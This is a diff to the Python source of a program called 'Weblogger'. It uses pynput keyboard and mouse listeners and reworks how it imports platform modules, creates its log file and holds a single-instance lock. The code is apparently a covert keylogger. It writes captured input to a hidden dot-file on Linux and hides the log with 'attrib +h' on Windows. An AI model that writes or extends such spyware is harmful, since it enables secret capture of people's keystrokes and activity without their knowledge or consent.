@@ -6,7 +6,6 @@ from pynput.mouse import Button, Listener as mouseListener
 import os
 import sys
 import re
-import fcntl
 import signal
 import subprocess
 
@@ -15,6 +14,8 @@ if 'win' in sys.platform:
     import win32event
     import win32api
     import winerror
+elif 'linux' in sys.platform:
+    import fcntl
 
 
 class Weblogger(object):
@@ -39,13 +40,14 @@ class Weblogger(object):
         self.last_key = None
 
         self.get_log_file()
-        self.create_file()
 
     def get_log_file(self):
         if 'linux' in sys.platform:
             self.log_file = os.path.join(os.environ['HOME'], '.log.txt')
+            self.create_file()
         elif 'win' in sys.platform:
             self.log_file = os.path.join(os.environ['userprofile'], 'log.txt')
+            self.create_file()
             subprocess.call('attrib +h ' + self.log_file, shell=True)
         else:
             if self.LOGGING:
@@ -321,9 +323,9 @@ def create_lock():
     already_running = False
 
     if 'win' in sys.platform:
-        mutex = win32event.CreateMutex(None, 1, 'weblogger_mutex')
+        _lock = win32event.CreateMutex(None, 1, 'weblogger_mutex')
         if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-            mutex = None
+            _lock = None
             already_running = True
     else:
         _lock = open(os.path.realpath(sys.argv[0]), 'r')
